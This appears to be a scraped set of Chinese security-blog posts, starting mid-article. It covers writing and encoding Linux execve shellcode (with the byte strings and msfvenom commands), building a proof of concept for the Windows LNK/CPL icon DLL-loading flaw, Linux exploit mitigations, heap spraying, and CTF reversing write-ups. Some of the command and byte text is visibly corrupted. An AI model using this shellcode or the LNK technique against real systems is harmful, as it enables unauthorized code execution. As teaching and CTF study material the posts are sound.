0b mov $0xb,%al 8049006: 51 push %ecx 8049007: 68 2f 2f 73 68 push $0x68732f2f 804900c: 68 2f 62 69 6e push $0x6e69622f 8049011: 89 e3 mov %esp,%ebx 8049013: cd 80 int $0x80 为了在 C 程序中使用这段 shellcode，我们需将其 opcode 提取出来（我这里 cut:无效的字段范围） 12$ objdump -d ./tiny_execve_sh|grep &#x27;[0-9a-f]:&#x27;|grep -v &#x27;file&#x27;|cut -f2 -d:|cut -f1-6 -d&#x27; &#x27;|tr -s &#x27; &#x27;|tr &#x27;\\t&#x27; &#x27; &#x27;|sed &#x27;s/ $//g&#x27;|sed &#x27;s/ /\\\\x/g&#x27;|paste -d &#x27;&#x27; -s |sed &#x27;s/^/&quot;/&#x27;|sed &#x27;s/$/&quot;/g&#x27; &quot;\\x31\\xc9\\xf7\\xe1\\xb0\\x0b\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xcd\\x80&quot; 将提取出来的字符放到 C 程序的 shellcode[] 中。需要注意的是，shellcode 作为全局初始化变量，存放在 .data 段中，而编译时默认开启的 NX 保护机制，会将数据所在的内存页标识为不可执行，当程序转入 shellcode 执行时抛出异常。因此，下面需要关闭 NX。 12$ gcc -m32 -z execstack tiny_execve_sh_shellcode.c -o tiny_execve_sh_shellcode$ ./tiny_execve_sh_shellcode Linux 64 位的 shellcode 也一样。 1234567891011121314151617global _startsection .text _start: ; execve(&quot;/bin/sh&quot;, [&quot;/bin/sh&quot;], NULL) ;&quot;\\x48\\x31\\xd2\\x48\\xbb\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x48\\xc1\\xeb\\x08\\x53\\x48\\x89\\xe7\\x50\\x57\\x48\\x89\\xe6\\xb0\\x3b\\x0f\\x05&quot; xor rdx, rdx mov qword rbx, &#x27;//bin/sh&#x27; ; 0x68732f6e69622f2f shr rbx, 0x8 push rbx mov rdi, rsp push rax push rdi mov rsi, rsp mov al, 0x3b syscall 123$ nasm -f elf64 tiny_execve_sh64.asm $ ld -m elf_x86_64 tiny_execve_sh64.o -o tiny_execve_sh64 $ ./tiny_execve_sh64 4. shellcode 变形 有时，被注入进程的 shellcode 会被限制使用某些字符，例如不能有 NULL、只能用字母和数字等可见字符、ASCII 和 Unicode 编码转换等，因此需要进行一些处理。 由于 NULL 会将字符串操作函数截断，所以我们需要用其它相似功能的指令来替代，下面是一个 32 位指令替换的例子。 123456替换前：B8 01000000 MOV EAX,1替换后：33C0 XOR EAX,EAX40 INC EAX 对于只能使用可见字符字母（也就是只能用字母和数字组合）的情况，将 shellcode 的字符进行编码，使其符合限制条件。相应地，需要在 shellcode 中加入解码器，在代码行前将原始 shellcode 还原出来。 著名的渗透测试框架 Metasploit 中就集成了许多 shellcode 的编码器，这里我们选择 x86/alpha_mixed 来编码 32 位的 shellcode。 12345$ msfvenom -1 encoders | grep -i alphanumeric x86/alpha_mixed low Alpha2 Alphanumeric Mixedcase Encoder x86/alpha_upper low Alpha2 Alphanumeric Uppercase Encoder x86/unicode_mixed manual Alpha2 Alphanumeric Unicode Mixedcase Encoder x86/unicode uDper manual Alpha2 Alphanumeric Unicode Uppercase Encoder 12345678$ python -c &#x27;import sys; sys.stdout.write(&quot;\\x31\\xc9\\xf7\\xel\\xb0\\x0b\\x51\\x68\\:&lt;2f\\x2f\\xT?3\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xo3\\xcd\\x80&quot;)&#x27; | msfveno -p - -e x86/alpha_mixed -a linux -f raw -a x86 --platform linux BufterRegister=EAX Attempting to encode payload with 1 iterations of x86/alpha_mixed x86/alpha_mixed succeeded with size 96 (iteration=0)x86/alpha mixed chosen with final size 96Payload size: 96 bytes PYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJI01o9igHah04Ksa3XTodot31xBHtorBcYpnniis8MOpAA 参考： ​ Linux下shellcode的编写 ​ 带你玩转 Linux Shellcode ​ 简述获取shellcode的几种方式 ​ Linux下Shellcode编写 ​ Linux Syscall Table ​ 《CTF竞赛权威指南》","categories":[{"name":"CTF","slug":"CTF","permalink":"https://www.rgzzplus.com/categories/CTF/"}],"tags":[{"name":"shellcode","slug":"shellcode","permalink":"https://www.rgzzplus.com/tags/shellcode/"}]},{"title":"LNK快捷方式文件漏洞","slug":"LNK快捷方式文件漏洞","date":"2022-08-01T10:26:50.000Z","updated":"2022-08-01T10:28:00.356Z","comments":true,"path":"2022/08/01/LNK快捷方式文件漏洞/","link":"","permalink":"https://www.rgzzplus.com/2022/08/01/LNK%E5%BF%AB%E6%8D%B7%E6%96%B9%E5%BC%8F%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E/","excerpt":"","text":"[TOC] 漏洞简介 LNK 快捷方式文件漏洞，又叫 CPL Icon 加载漏洞。用户只要浏览一下 LNK 文件所在的目录病毒就能执行。 漏洞原理及利用分析 既然是快捷方式漏洞，那我们就先了解以下快捷方式文件的格式。 快捷方式文件的格式 快捷方式文件的结构是分段式的。 触发漏洞的数据保存在 Shell Item Id List 段中，所以我们只介绍该段的数据结构。 Shell Item Id List 段为可选段，一个快捷方式文件中是否存在 Shell Item Id List 段是由文件头中偏移 0x14 位置处的值来决定，0bit 值为 1 时，表示该 lnk 文件包含该结构。同时如果存在该结构，偏移 0x4c 的位置的会存在一个 unsigned short int 型的变量，用来标识 Shell Item Id List 结构的大小，紧随其后的为一系列的 SHITEMID 结构，该结构体定义如下。 12345678typedef struct _SHITEMID&#123;unsigned short int cb; //cb标识一项SHITEMID结构大小unsigned char abID[0]; //abID是可变结构， //存储具体数据，但第0项里面的 //数据是不能修改的， //否则.lnk文件无法运行。&#125;SHITEMID,*LPSHITEMID; 漏洞触发的原理：SHELL32.DLL 在根据 Shell Item Id 加载快捷方式图标的时候未对被加载的项目（DLL 或者 CPL）进行有效性校验，造成了攻击者可能通过构造特殊的 Shell Item Id 来加载恶意的 DLL。 漏洞文件生成 实验环境：windows 2000 sp4 由于触发这个漏洞需要 CPL 加载机制，所以并不是所有的快捷方式文件都可以触发这个漏洞，只有指向控制面板下面功能的快捷方式才能够出发这个漏洞。 建立基础 LNK 文件： 大家可以通过右键单击控制面板下面的图片，然后选择“创建快捷方式”选项来建立基础 LNK 文件。在这我们以“鼠标”为例。 将建立好符合要求的基础 LNK 文件改造成能够触发漏洞的 POC 文件： （1）用WinHex打开鼠标.LNK文件，将偏移 0x7A 到 0x7D 的 0x9CFFFFFF 修改为 0x00000000。需要注意的是，如果您在建立基础 LNK 文件时不是使用的“鼠标”项目， 0x7A 到 0x7D 的值可能不是 0x9CFFFFFF。 ​ （2）在偏移 0x8E 位置处写入我们要加载的 DLL 地址，在这我们使用 C:\\DLL.DLL，其效果是弹出一个“test”对话框，当然您也可以选择使用其他的 DLL 来进行调试。 漏洞产生原理 这个 POC 的最终目的是加载一个 DLL 文件，所以我们可以先在 LoadLibraryW 函数上设置断点，然后再通过回溯函数调用过程的方式找到上层函数，最终找到出问题的函数。 首先，我们先用下面的源码 再vc6.0中编写一个能弹出对话框的 DLL 文件，然后把这个文件重命名为 DLL.DLL 并放到 C 盘下。 1234567891011//DLL.dll#include &quot;stdafx.h&quot;BOOL APIENTRY DllMain( HANDLE hModule, DWORD ul_reason_for_call, LPVOID lpReserved )&#123; MessageBoxA(NULL,&quot;Hello World&quot;,&quot;Test&quot;,MB_OK); return TRUE;&#125; 然后再用 OllyDbg 附加到 explorer.exe 的进程上，对 LoadLibraryW 函数设置断点，接下来浏览以下保存我们修改的 LNK 文件的目录。此时，可能会出现两种情况。 OllyDbg 中断触发。如果是这样我们就能在 view --&gt;Call stack 菜单中查看当前函数调用情况。 OllyDbg 中断未触发，这是因为您已经浏览过这个目录。由于快捷方式图标的加载具有缓存机制，如果以前已经加载过，现在他就不会再重复加载。此时您可以将 LNK 文件重命名，之后 OllyDbg 中的断点就可以触发了。 中断后，我们能在栈中看到本次 LoadLibraryW 函数调用的 FileName 参数为 “C:\\DLL.DLL”，说明我们找对地方了，并且我这里也直接出现了弹出框。如果没有看到这个参数，那就多按几次 F9。 接下来我们通过 Call stack 查看函数调用情况。 shell32在处理lnk文件的时候要把它的图标显示出来，对于一般文件应该是从Icon filename string里面解析，但对于文件后面没有Icon filename string结构的控制面板快捷方式，是直接从0x7A那里的iconindex来解析。当这个iconindex是0的时候，会去加载cpl文件，调用CPlApplet接口，这样就存在执行DLL中代码的问题。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384857D716064 53 push ebx7D716065 FF75 10 push dword ptr [ebp+10]7D716068 8D5E 0C lea ebx, dword ptr [esi+C]7D71606B 53 push ebx7D71606C FF75 0C push dword ptr [ebp+C] ;C:\\dll.dll,0,&lt;-这个0就是从偏移7A那里得到的iconindex7D71606F FF15 0015597D call dword ptr [&lt;&amp;KERNEL32.lstrcpynW&gt;&gt;; kernel32.lstrcpynW7D716075 6A 2C push 2C7D716077 FF75 0C push dword ptr [ebp+C]7D71607A FF15 F41B597D call dword ptr [&lt;&amp;SHLWAPI.StrChrW&gt;] ; shlwapi.StrChrW7D716080 85C0 test eax, eax7D716082 74 5D je short 7D7160E17D716084 66:8320 00 and word ptr [eax], 07D716088 83C0 02 add eax, 27D71608B 50 push eax7D71608C FF15 641C597D call dword ptr [&lt;&amp;SHLWAPI.StrToIntW&gt;] ; shlwapi.StrToIntW7D716092 8B7D 14 mov edi, dword ptr [ebp+14]7D716095 8907 mov dword ptr [edi], eax7D716097 8B45 18 mov eax, dword ptr [ebp+18]7D71609A C700 02000000 mov dword ptr [eax], 27D7160A0 8B0F mov ecx, dword ptr [edi]7D7160A2 33D2 xor edx, edx7D7160A4 3BCA cmp ecx, edx ;偏移0x7A必须得是0，才会LoadLibary7D7160A6 75 33 jnz short 7D7160DB7D7160A8 C700 1A000000 mov dword ptr [eax], 1A7D7160AE 8D86 14020000 lea eax, dword ptr [esi+214]7D7160B4 3910 cmp dword ptr [eax], edx7D7160B6 8955 0C mov dword ptr [ebp+C], edx7D7160B9 75 16 jnz short 7D7160D17D7160BB 8D4D 0C lea ecx, dword ptr [ebp+C]7D7160BE 51 push ecx7D7160BF 8D8E 18020000 lea ecx, dword ptr [esi+218]7D7160C5 51 push ecx7D7160C6 50 push eax7D7160C7 53 push ebx7D7160C8 E8 48C4F2FF call 7D642515 ;这里调用后面 后面7D63866D FF15 6415597D call dword ptr [&lt;&amp;KERNEL32.GetCurrent&gt;; kernel32.GetCurrentProcessId7D638673 50 push eax7D638674 56 push esi7D638675 68 00001000 push 100000 ; UNICODE &quot;f1df_6.0.2600.5512_x-ww_35d4ce83\\&quot;7D63867A 8985 E4FDFFFF mov dword ptr [ebp-21C], eax7D638680 FF15 6815597D call dword ptr [&lt;&amp;KERNEL32.OpenProces&gt;; kernel32.OpenProcess7D638686 3BC6 cmp eax, esi7D638688 8985 E8FDFFFF mov dword ptr [ebp-218], eax7D63868E 0F84 E5000000 je 7D6387797D638694 8D85 F4FDFFFF lea eax, dword ptr [ebp-20C]7D63869A 50 push eax7D63869B FF15 A41C597D call dword ptr [&lt;&amp;SHLWAPI.PathFileExi&gt;; shlwapi.PathFileExistsW7D6386A1 85C0 test eax, eax7D6386A3 C785 BCFDFFFF 2&gt;mov dword ptr [ebp-244], 207D6386AD 74 14 je short 7D6386C37D6386AF 8D85 F4FDFFFF lea eax, dword ptr [ebp-20C]7D6386B5 89B5 C0FDFFFF mov dword ptr [ebp-240], esi7D6386BB 8985 C4FDFFFF mov dword ptr [ebp-23C], eax7D6386C1 EB 1A jmp short 7D6386DD7D6386C3 C785 C0FDFFFF 0&gt;mov dword ptr [ebp-240], 87D6386CD 899D C4FDFFFF mov dword ptr [ebp-23C], ebx7D6386D3 C785 D0FDFFFF 7&gt;mov dword ptr [ebp-230], 7B7D6386DD 8D85 BCFDFFFF lea eax, dword ptr [ebp-244]7D6386E3 50 push eax7D6386E4 FF15 6C15597D call dword ptr [&lt;&amp;KERNEL32.CreateActC&gt;; kernel32.CreateActCtxW7D6386EA 83F8 FF cmp eax, -17D6386ED 8985 F0FDFFFF mov dword ptr [ebp-210], eax7D6386F3 75 06 jnz short 7D6386FB7D6386F5 89B5 F0FDFFFF mov dword ptr [ebp-210], esi7D6386FB 8B3D 8C15597D mov edi, dword ptr [&lt;&amp;KERNEL32.Activ&gt;; kernel32.ActivateActCtx7D638701 8D85 ECFDFFFF lea eax, dword ptr [ebp-214]7D638707 50 push eax7D638708 FFB5 F0FDFFFF push dword ptr [ebp-210]7D63870E FFD7 call edi7D638710 33F6 xor esi, esi7D638712 46 inc esi7D638713 56 push esi7D638714 56 push esi7D638715 56 push esi7D638716 53 push ebx7D638717 FF15 00F0787D call dword ptr [7D78F000] ; apphelp.ApphelpCheckExe7D63871D 85C0 test eax, eax7D63871F 75 08 jnz short 7D6387297D638721 2185 E0FDFFFF and dword ptr [ebp-220], eax7D638727 EB 0D jmp short 7D6387367D638729 53 push ebx ;加载DLL7D63872A FF15 A015597D call dword ptr [&lt;&amp;KERNEL32.LoadLibrar&gt;; kernel32.LoadLibraryW7D638730 8985 E0FDFFFF mov dword ptr [ebp-220], eax ; dll.01C00000 参考： ​ LNK快捷方式文件漏洞简要分析 ​ 0day2：软件漏洞分析精要","categories":[{"name":"0day安全","slug":"0day安全","permalink":"https://www.rgzzplus.com/categories/0day%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"漏洞","slug":"漏洞","permalink":"https://www.rgzzplus.com/tags/%E6%BC%8F%E6%B4%9E/"}]},{"title":"Linux中的保护机制","slug":"Linux中的保护机制","date":"2022-08-01T10:24:46.000Z","updated":"2022-08-01T15:03:15.289Z","comments":true,"path":"2022/08/01/Linux中的保护机制/","link":"","permalink":"https://www.rgzzplus.com/2022/08/01/Linux%E4%B8%AD%E7%9A%84%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/","excerpt":"","text":"[TOC] 在编写漏洞利用代码的时候，需要特别注意目标进程是否开启了NX、PIE等机制，例如存在NX的话就不能直接执行栈上的数据，存在PIE 的话各个系统调用的地址就是随机化的。 一：canary（栈保护） 栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让shellcode能够得到执行。当启用栈保护后，函数开始执行的时候会先往栈里插入cookie信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。在Linux中我们将cookie信息称为canary。 gcc在4.2版本中添加了-fstack-protector和-fstack-protector-all编译参数以支持栈保护功能， 因此在编译时可以控制是否开启栈保护以及程度，例如： 1、gcc -o test test.c // 默认情况下，不开启Canary保护 2、gcc -fno-stack-protector -o test test.c //禁用栈保护 3、gcc -fstack-protector -o test test.c //启用堆栈保护，不过只为局部变量中含有 char 数组的函数插入保护代码 4、gcc -fstack-protector-all -o test test.c //启用堆栈保护，为所有函数插入保护代码 二：NX（no execute） NX即No-eXecute（不可执行）的意思，NX（DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。 gcc编译器默认开启了NX选项，如果需要关闭NX选项，可以给gcc编译器添加-z execstack参数。 例如： 1、gcc -o test test.c // 默认情况下，开启NX保护 2、gcc -z execstack -o test test.c // 禁用NX保护 3、gcc -z noexecstack -o test test.c // 开启NX保护 在Windows下，类似的概念为DEP（数据执行保护） 三：PIE（position-independent executables） 位置独立的可执行区域。这样使得在利用缓冲溢出和移动操作系统中存在的其他内存崩溃缺陷时采用面向返回的编程（return-oriented programming）方法变得难得多。一般情况下NX（Windows平台上称其为DEP）和地址空间分布随机化（ASLR）会同时工作。内存地址随机化机制（address space layout randomization)，有以下三种情况： 0 - 表示关闭进程地址空间随机化。 1 - 表示将mmap的基址，stack和vdso页面随机化。 2 - 表示在1的基础上增加栈（heap）的随机化。 liunx下关闭PIE的命令如下： sudo -s echo 0 &gt; /proc/sys/kernel/randomize_va_space gcc编译命令： 1、gcc -o test test.c // 默认情况下，不开启PIE 2、gcc -fpie -pie -o test test.c // 开启PIE，此时强度为1 3、gcc -fPIE -pie -o test test.c // 开启PIE，此时为最高强度2 4、gcc -fpic -o test test.c // 开启PIC，此时强度为1，不会开启PIE 5、gcc -fPIC -o test test.c // 开启PIC，此时为最高强度2，不会开启PIE 四：RELRO（ read only relocation） 在Linux系统安全领域，数据可以写的存储区就会是攻击的目标，尤其是存储函数指针的区域。 所以在安全防护的角度来说尽量减少可写的存储区域对安全会有极大的好处。GCC, GNU linker以及Glibc-dynamic linker一起配合实现了一种叫做relro的技术:。大概实现就是由linker指定binary的一块经过dynamic linker处理过 relocation之后的区域为只读.设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对GOT（Global Offset Table）攻击。RELRO为” Partial RELRO”，说明我们对GOT表具有写权限。 gcc编译： gcc -o test test.c // 默认情况下，是Partial RELRO gcc -z norelro -o test test.c // 关闭，即No RELRO gcc -z lazy -o test test.c // 部分开启，即Partial RELRO gcc -z now -o test test.c // 全部开启 五 总结 各种安全选择的编译参数如下： NX：-z execstack / -z noexecstack (关闭 / 开启) Canary：-fno-stack-protector /-fstack-protector / -fstack-protector-all (关闭 / 开启 / 全开启) PIE：-no-pie / -pie (关闭 / 开启) RELRO：-z norelro / -z lazy / -z now (关闭 / 部分开启 / 完全开启) 参考资料：https://www.cnblogs.com/Spider-spiders/p/8798628.html 本文转载于：狐狸在飞","categories":[{"name":"转载","slug":"转载","permalink":"https://www.rgzzplus.com/categories/%E8%BD%AC%E8%BD%BD/"}],"tags":[{"name":"Linux保护机制","slug":"Linux保护机制","permalink":"https://www.rgzzplus.com/tags/Linux%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/"}]},{"title":"HeapSpary技术及疑问","slug":"HeapSpary技术及疑问","date":"2022-07-27T08:08:48.000Z","updated":"2022-08-01T11:18:24.209Z","comments":true,"path":"2022/07/27/HeapSpary技术及疑问/","link":"","permalink":"https://www.rgzzplus.com/2022/07/27/HeapSpary%E6%8A%80%E6%9C%AF%E5%8F%8A%E7%96%91%E9%97%AE/","excerpt":"","text":"为什么heap spary要用0x0C0C0C0C这个奇怪的数字？ 在讨论这个问题之前，先向小白介绍一下什么是 Heap Spary？ Heap Spary 又叫堆喷射，是在 shellcode 的前面加上大量的slide code(滑板指令)，组成一个注入代码段。然后向系统申请大量内存，并且反复用注入代码段来填充。这样就使得内存被大量的注入代码占据。然后通过结合其他漏洞控制程序流，使得程序执行到堆上，最终将导致shellcode的执行。 Heap Spary 执行流程： 堆喷射将 shellcode放置在了堆中，在堆中执行代码。 使用浏览器程序打开我们的poc样本时，它会执行我们样本文件中的JavaScript代码。 控制程序eip，使其指向0x0C0C0C0C地址。 了解到 Heap Spary 后，再来讨论，为什么一定要用 0x0C0C0C0C 填充滑板指令？ （1）0x0C0C0C0C会被程序解释成 OR AL,0C 可以作为滑板指令（即执行此种指令不会对程序的后续行为产生影响），有人说为什么不使用0x90（也是滑板指令）呢？请看下一条。 （2）之前说过，我们的shellcode会被放到堆中去执行，也就是所谓的使eip指向0x0C0C0C0C这个地址，而0x0C0C0C0C这个地址从0计算的话，大概在192mb左右，但0x90909090就不言而喻了，需要申请的堆空间那就相当大了。 又有人会说为甚麽一定要让我们的eip指向0x0C0C0C0C呢？ 堆喷射成功的前提是，我们填充的过程中恰好覆盖了一个虚函数指针，当该虚函数被调用时，先取得栈中的对象指针，通过对象指针取得虚表指针，然后在虚表内适当偏移处取得函数指针执行，过程如下： 因此根据上述过程，当我们使用“0c0c0c0c”作为slide code进行填充时，我们地址0x0c0c0c0c处也必须为“0c0c0c0c”，而正由于这个地址是自指向的，因此恰好执行“0c0c0c0c”命令直到执行shellcode。若为其他地址，将会导致指针跳转至其他地方，无法确保完成shellcode的执行。 也可以通过缓冲区溢出漏洞将EIP修改为0x0c0c0c0c就能跳转到该位置，然后完成shellcode的执行。 参考： ​ Heap Spary原理 ​ 初识堆喷射及事例(暴雷漏洞)分析 ​ 为什么heap spary要用0x0C0C0C0C这个奇怪的数字？","categories":[{"name":"0day安全","slug":"0day安全","permalink":"https://www.rgzzplus.com/categories/0day%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"HeapSpary","slug":"HeapSpary","permalink":"https://www.rgzzplus.com/tags/HeapSpary/"}]},{"title":"函数指针","slug":"函数指针","date":"2022-07-27T07:57:50.000Z","updated":"2022-08-01T10:30:12.616Z","comments":true,"path":"2022/07/27/函数指针/","link":"","permalink":"https://www.rgzzplus.com/2022/07/27/%E5%87%BD%E6%95%B0%E6%8C%87%E9%92%88/","excerpt":"","text":"[TOC] 函数指针的定义 程序中的每个函数都位于内存中的某个位置，所以存在**指向那个位置的指针（函数指针）**是完全可能的。 函数指针定义形式： 123returnType (*pointerName)(param list);//例子int (*pf)(); returnType 为函数返回值类型，pointerNmae 为指针名称，param list 为函数参数列表。参数列表中可以同时给出参数的类型和名称，也可以只给出参数的类型，省略参数的名称，这一点和函数原型非常类似。 注意( )的优先级高于*，第一个括号不能省略，如果写作returnType *pointerName(param list);就成了函数原型，它表明函数的返回值类型为returnType *。 函数指针的用法 初始化函数指针的方法： 123int f(int);int (*pf)(int) = &amp;f; 初始化表达式中的&amp;操作符是可选的，因为函数名被使用时总是由编译器把它转换为函数指针。&amp;操作符只是显式地说明了编译器将隐式执行的任务。 在函数指针被声明并且初始化之后，我们就可以使用三种方式调用函数: 1234int ans;ans = f(25);ans = (*pf)(25);ans = pf(25); 第1条语句简单地使用名字调用函数f， 但它的执行过程可能和你想象的不太一样。函数名 f 首先被转换为一个函数指针，该指针指定函数在内存中的位置。然后，函数调用操作符调用该函数，执行开始于这个地址的代码。 第2条语句对pf执行间接访问操作，它把函数指针转换为一个函数名。这个转换并不是真正需要的，因为编译器在执行函数调用操作符之前又会把它转换回去。不过，这条语句的效果和第1条语句是完全一样的。 第3条语句和前两条语句的效果是一样的。间接访问操作并非必需，因为编译器需要的是一个函数指针。这个例子显示了函数指针通常是如何使用的。 参考： ​ C语言函数指针（指向函数的指针） ​ C和指针","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://www.rgzzplus.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"c","slug":"c","permalink":"https://www.rgzzplus.com/tags/c/"},{"name":"函数指针","slug":"函数指针","permalink":"https://www.rgzzplus.com/tags/%E5%87%BD%E6%95%B0%E6%8C%87%E9%92%88/"}]},{"title":"kali搭建pwn环境","slug":"kali搭建pwn环境","date":"2022-07-27T07:32:48.000Z","updated":"2022-08-01T11:18:47.431Z","comments":true,"path":"2022/07/27/kali搭建pwn环境/","link":"","permalink":"https://www.rgzzplus.com/2022/07/27/kali%E6%90%AD%E5%BB%BApwn%E7%8E%AF%E5%A2%83/","excerpt":"","text":"[toc] 系统环境 **系统环境：**Linux kali 5.14.0-kali4-amd64 (2021-11-05) 搭建步骤 第一步 在主目录下创建一个 tools 目录，用来存放下载下来的文件，命令如下： 1mkdir tools 第二步 安装pwntools 进入tools文件夹里面 1cd tools 把 pwntools clone下来 1git clone https://github.com/Gallopsled/pwntools.git 安装所需环境 1sudo apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential 更新 pip 1python3 -m pip install --upgrade pip 我之前安装过python3 和相关的依赖，所以才会出现 黄字 使用 pip 安装并更新 pwntools 1python3 -m pip install --upgrade pwntools 到这里 pwntools 环境已经搭建好了 搭建gdb调试环境 安装gdb-multiarch，用作gdb客户端进行调试，是任何架构的通用客户端 1sudo apt-get install gdb-multiarch 检查安装是否成功 1gdb -v 安装插件 pwndbg是一个方便 gdb 使用的插件 先将pwndbg git 下来 1git clone https://github.com/pwndbg/pwndbg.git 然后进入到文件夹中，执行 setup.sh 文件 12cd ~/tools/pwndbg./setup.sh 检查插件是否挂载成功，在终端输入gdb，结果如下： 其它插件peda，def安装 1git clone https://github.com/longld/peda.git 1git clone https://github.com/hugsy/gef.git 安装插件依赖 1sudo pip install keystone-engine ropper keystone-engine 在这里我发现我没有切换目录下载插件，但是没关系，我们将gef 和peda 文件夹放到tools里 在 gdbinit 中挂载插件： 1sudo vim ~/.gdbinit 按 i 键编辑，从第二行开始输入下面内容： 12#source /home/kali/tools/peda/peda.py#source /home/kali/tools/gef/gef.py 选择插件中的其中一个，其他的注释掉，按esc键并输入:wq退出即可。 至此，pwn环境搭建完成。","categories":[{"name":"工具","slug":"工具","permalink":"https://www.rgzzplus.com/categories/%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"https://www.rgzzplus.com/tags/pwn/"}]},{"title":"攻防世界Reversing-x64Elf-100","slug":"攻防世界Reversing-x64Elf-100","date":"2022-07-24T02:39:54.000Z","updated":"2022-07-24T02:42:33.525Z","comments":true,"path":"2022/07/24/攻防世界Reversing-x64Elf-100/","link":"","permalink":"https://www.rgzzplus.com/2022/07/24/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CReversing-x64Elf-100/","excerpt":"","text":"附件下载下来，后缀是 .re，起初我还以为是压缩文件，拖进bandizip结果识别为未知文件格式。 google：.re 文件大多属于 Image File。原文 然后我试着拖进 IDA，能解析。 12345678910111213141516171819202122__int64 __fastcall main(int a1, char **a2, char **a3)&#123; __int64 result; // rax char s[264]; // [rsp+0h] [rbp-110h] BYREF unsigned __int64 v5; // [rsp+108h] [rbp-8h] v5 = __readfsqword(0x28u); printf(&quot;Enter the password: &quot;); if ( !fgets(s, 255, stdin) ) return 0LL; if ( (unsigned int)sub_4006FD((__int64)s) ) &#123; puts(&quot;Incorrect password!&quot;); result = 1LL; &#125; else &#123; puts(&quot;Nice!&quot;); result = 0LL; &#125; return result;&#125; 从反汇编代码中可以看到 sub_40006FD 函数是关键。 123456789101112131415__int64 __fastcall sub_4006FD(__int64 a1)&#123; int i; // [rsp+14h] [rbp-24h] __int64 v3[4]; // [rsp+18h] [rbp-20h] v3[0] = (__int64)&quot;Dufhbmf&quot;; v3[1] = (__int64)&quot;pG`imos&quot;; v3[2] = (__int64)&quot;ewUglpt&quot;; for ( i = 0; i &lt;= 11; ++i ) &#123; if ( *(char *)(v3[i % 3] + 2 * (i / 3)) - *(char *)(i + a1) != 1 ) return 1LL; &#125; return 0LL;&#125; *(char *)(v3[i % 3] + 2*(i / 3)) 是一个二维数组，它与 a1[i] 相差 1。 要想得到 a1 ，就 *(char *)(v3[i % 3] + 2*(i / 3)) - 1 1234567a=[&quot;Dufhbmf&quot;,&quot;pG`imos&quot;,&quot;ewUglpt&quot;]s=&#x27;&#x27;for i in range(12): s+=chr(ord(a[i % 3][2 * int(i / 3)])-1)print(s) 结果：Code_Talkers 注意：用 int(i/3) 是由于 python 不会像 c/c++ 一样自动将触发取整。 参考: Reversing-x64Elf-100","categories":[{"name":"CTF","slug":"CTF","permalink":"https://www.rgzzplus.com/categories/CTF/"}],"tags":[{"name":"攻防世界","slug":"攻防世界","permalink":"https://www.rgzzplus.com/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"},{"name":"reverse","slug":"reverse","permalink":"https://www.rgzzplus.com/tags/reverse/"}]},{"title":"攻防世界666","slug":"攻防世界666","date":"2022-07-24T02:39:11.000Z","updated":"2022-07-24T02:41:47.094Z","comments":true,"path":"2022/07/24/攻防世界666/","link":"","permalink":"https://www.rgzzplus.com/2022/07/24/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C666/","excerpt":"","text":"题目地址：666 将附件下载到本地后，直接拖进 IDA 进行分析，点击进入 main 函数。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566 ; =============== S U B R O U T I N E ======================================= ; Attributes: bp-based frame ; int __cdecl main(int argc, const char **argv, const char **envp) public main main proc near ; DATA XREF: _start+1D↑o s = byte ptr -1E0h ; s[480] var_F0 = byte ptr -0F0h ; var_fo[240],存放scanf输入参数 ; __unwind &#123; push rbp mov rbp, rsp sub rsp, 1E0h lea rax, [rbp+s] mov edx, 1Eh ; n mov esi, 0 ; c mov rdi, rax ; s call _memset ; memset(s, 0, 0x1EuLL); lea rdi, format ; &quot;Please Input Key: &quot; mov eax, 0 call _printf lea rax, [rbp+var_F0] mov rsi, rax lea rdi, aS ; &quot;%s&quot; mov eax, 0 call ___isoc99_scanf lea rdx, [rbp+s] lea rax, [rbp+var_F0] mov rsi, rdx mov rdi, rax call encode ;关键函数，这里对输入字符进行了加密 lea rax, [rbp+var_F0] mov rdi, rax ; s call _strlen mov rdx, rax mov eax, cs:key cdqe cmp rdx, rax jnz short loc_138D lea rax, [rbp+s] lea rsi, enflag ; &quot;izwhroz\\&quot;\\&quot;w\\&quot;v.K\\&quot;.Ni&quot; mov rdi, rax ; s1 call _strcmp test eax, eax jnz short loc_1381 lea rdi, aYouAreRight ; &quot;You are Right&quot; call _puts jmp short loc_138D ; --------------------------------------------------------------------------- loc_1381: ; CODE XREF: main+A0↑j lea rdi, aFlagThis1sF4ck ; &quot;flag&#123;This_1s_f4cker_flag&#125;&quot; call _puts loc_138D: ; CODE XREF: main+86↑j ; main+AE↑j mov eax, 0 leave retn; &#125; // starts at 12D1 main endp 按下 F5 ，反汇编，这下就清楚程序运行逻辑了，程序对输入字符进行字符编码，然后与 enflag（“izwhroz”“w&quot;v.K”.Ni&quot;）进行比较。。。 123456789101112131415161718int __cdecl main(int argc, const char **argv, const char **envp)&#123; char s[240]; // [rsp+0h] [rbp-1E0h] BYREF char v5[240]; // [rsp+F0h] 